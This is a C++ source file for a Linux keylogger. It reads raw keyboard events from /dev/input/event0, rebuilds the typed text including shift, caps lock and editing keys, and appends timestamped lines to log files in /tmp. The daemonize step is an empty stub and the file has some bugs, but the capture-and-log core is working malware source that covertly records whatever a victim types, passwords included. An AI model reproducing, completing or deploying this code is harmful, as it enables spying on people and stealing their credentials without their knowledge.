#include <chrono>
#include <cstring>
#include <ctime>
#include <fstream>
#include <iostream>
#include <map>
#include <string>
#include <vector>

#include <linux/input.h>

#define LOGS_DIRECTORY  "/tmp/"

struct keylogger_ctx {
    bool is_capslock_on;
    bool is_shitf_pressed;
    std::string kb_file;
    std::vector<char> kb_buffer;
    int buffer_cursor;
    struct input_event event;
};

struct key_event_handler {
    char key_char;
    char key_char_shift;
    void (*cb)(struct keylogger_ctx *);
};

void handle_key(struct keylogger_ctx *);
void handle_enter(struct keylogger_ctx *);
void handle_backspace(struct keylogger_ctx *);
void handle_capslock(struct keylogger_ctx *);
void handle_delete(struct keylogger_ctx *);
void handle_arrow(struct keylogger_ctx *);
void handle_shift(struct keylogger_ctx *);

static const std::map<int, struct key_event_handler> handlers{
    { KEY_0, { '0', ')', handle_key } },
    { KEY_1, { '1', '!', handle_key } },
    { KEY_2, { '2', '@', handle_key } },
    { KEY_3, { '3', '#', handle_key } },
    { KEY_4, { '4', '$', handle_key } },
    { KEY_5, { '5', '%', handle_key } },
    { KEY_6, { '6', '\0', handle_key } }, // TODO
    { KEY_7, { '7', '&', handle_key } },
    { KEY_8, { '8', '*', handle_key } },
    { KEY_9, { '9', '(', handle_key } },
    { KEY_A, { 'a', 'A', handle_key } },
    { KEY_B, { 'b', 'B', handle_key } },
    { KEY_C, { 'c', 'C', handle_key } },
    { KEY_D, { 'd', 'D', handle_key } },
    { KEY_E, { 'e', 'E', handle_key } },
    { KEY_F, { 'f', 'F', handle_key } },
    { KEY_G, { 'g', 'G', handle_key } },
    { KEY_H, { 'h', 'H', handle_key } },
    { KEY_I, { 'i', 'I', handle_key } },
    { KEY_J, { 'j', 'J', handle_key } },
    { KEY_K, { 'k', 'K', handle_key } },
    { KEY_L, { 'l', 'L', handle_key } },
    { KEY_M, { 'm', 'M', handle_key } },
    { KEY_N, { 'n', 'N', handle_key } },
    { KEY_O, { 'o', 'O', handle_key } },
    { KEY_P, { 'p', 'P', handle_key } },
    { KEY_Q, { 'q', 'Q', handle_key } },
    { KEY_R, { 'r', 'R', handle_key } },
    { KEY_S, { 's', 'S', handle_key } },
    { KEY_T, { 't', 'T', handle_key } },
    { KEY_U, { 'u', 'U', handle_key } },
    { KEY_V, { 'v', 'V', handle_key } },
    { KEY_W, { 'w', 'W', handle_key } },
    { KEY_X, { 'x', 'X', handle_key } },
    { KEY_Y, { 'y', 'Y', handle_key } },
    { KEY_Z, { 'z', 'Z', handle_key } },
    { KEY_COMMA, { ',', '<', handle_key } },
    { KEY_DOT, { '.', '>', handle_key } },
    { KEY_MINUS, { '-', '_', handle_key } },
    { KEY_SEMICOLON, { ';', ':', handle_key } },
    { KEY_EQUAL, { '=', '+', handle_key } },
    { KEY_SPACE, { ' ', '\0', handle_key } },
    { KEY_ENTER, { '\0', '\0', handle_enter } },
    { KEY_BACKSPACE, { '\0', '\0', handle_backspace } },
    { KEY_CAPSLOCK, { '\0', '\0', handle_capslock } },
    { KEY_DELETE, { '\0', '\0', handle_delete } },
    { KEY_RIGHT, { '\0', '\0', handle_arrow } },
    { KEY_LEFT, { '\0', '\0', handle_arrow } },
    { KEY_LEFTSHIFT, { '\0', '\0', handle_shift } }
};

std::vector<std::string> get_keyboard_files()
{
    //std::ifstream file{"/proc/bus/input/devices"};
    std::vector<std::string> list;
    //std::vector<std::string> content;
    //std::string line;

    //for (int i = 0; std::getline(file, line); i++) {
    //    if (!line.compare("")) {
    //        for (auto &line : content) {
    //            if (line.find("EV=120013")) {

    //            }

    //        }
    //    } else {
    //        content.emplace_back(line);
    //    }
    //}

    return list;
}

void handle_key(struct keylogger_ctx *ctx)
{
    if (!ctx->event.value) {
        return;
    }

    auto key_code = ctx->event.code;
    auto key_char = ctx->is_shitf_pressed
        ? handlers.at(key_code).key_char_shift
        : handlers.at(key_code).key_char;

    if (ctx->is_capslock_on && (key_char >= 'a' || key_char <= 'z')) {
        key_char -= 32;
    }

    ctx->kb_buffer.insert(
        ctx->kb_buffer.begin() + ctx->buffer_cursor++,
        key_char
    );
}

void handle_enter(struct keylogger_ctx *ctx)
{
    char date[11], timestamp[9];

    if (!ctx->event.value) {
        return;
    }

    {
        auto now = std::chrono::system_clock::to_time_t(
            std::chrono::system_clock::now()
        );

        std::strftime(
            date,
            sizeof(date),
            "%d_%m_%Y",
            std::localtime(&now)
        );
        std::strftime(
            timestamp,
            sizeof(timestamp),
            "%H:%M:%S",
            std::localtime(&now)
        );
    }

    std::ofstream log_file{
        std::string{LOGS_DIRECTORY} + "log_" + date, std::ios::app
    };

    log_file << "[" << timestamp << "] ";
    log_file.write(ctx->kb_buffer.data(), ctx->kb_buffer.size());
    log_file << "\n";

    ctx->kb_buffer.clear();
    ctx->buffer_cursor = 0;
}

void handle_capslock(struct keylogger_ctx *ctx)
{
    if (!ctx->event.value) {
        return;
    }

    ctx->is_capslock_on = !ctx->is_capslock_on;
}

void handle_shift(struct keylogger_ctx *ctx)
{
    ctx->is_shitf_pressed = ctx->event.value;
}

void handle_delete(struct keylogger_ctx *ctx)
{
    if (!ctx->event.value) {
        return;
    }

    if (ctx->buffer_cursor < ctx->kb_buffer.size()) {
        ctx->kb_buffer.erase(ctx->kb_buffer.begin() + ctx->buffer_cursor);
    }
}

void handle_backspace(struct keylogger_ctx *ctx)
{
    if (!ctx->event.value) {
        return;
    }

    if (!ctx->kb_buffer.empty()) {
        ctx->kb_buffer.erase(
            ctx->kb_buffer.begin() + (--ctx->buffer_cursor)
        );
    }
}

void handle_arrow(struct keylogger_ctx *ctx)
{
    if (!ctx->event.value) {
        return;
    }

    auto current_key = ctx->event.code;

    ctx->buffer_cursor = (current_key == KEY_LEFT)
        ? (ctx->buffer_cursor - 1)
        : (ctx->buffer_cursor + 1);
}

void deamonize()
{

}

int main(int argc, char *argv[])
{
    struct input_event ev;
    struct keylogger_ctx ctx = {
        .is_capslock_on = false,
        .kb_file = "/dev/input/event0", // TODO
        .buffer_cursor = 0
    };

    if (argc > 1 && !std::strcmp(argv[1], "-d")) {
        deamonize();
    }

    {
        std::ifstream kb_file{ctx.kb_file};

        while (1) {
            kb_file.read((char *)&ev, sizeof(struct input_event));

            if (ev.type == EV_KEY) {
                try {
                    auto ev_handler = handlers.at(ev.code);

                    ctx.event = ev;
                    ev_handler.cb(&ctx);
                } catch (...) {
                    std::cout << "no event handler for key " << ev.code
                        << std::endl;
                }
            }
        }
    }

    std::exit(EXIT_SUCCESS);
}
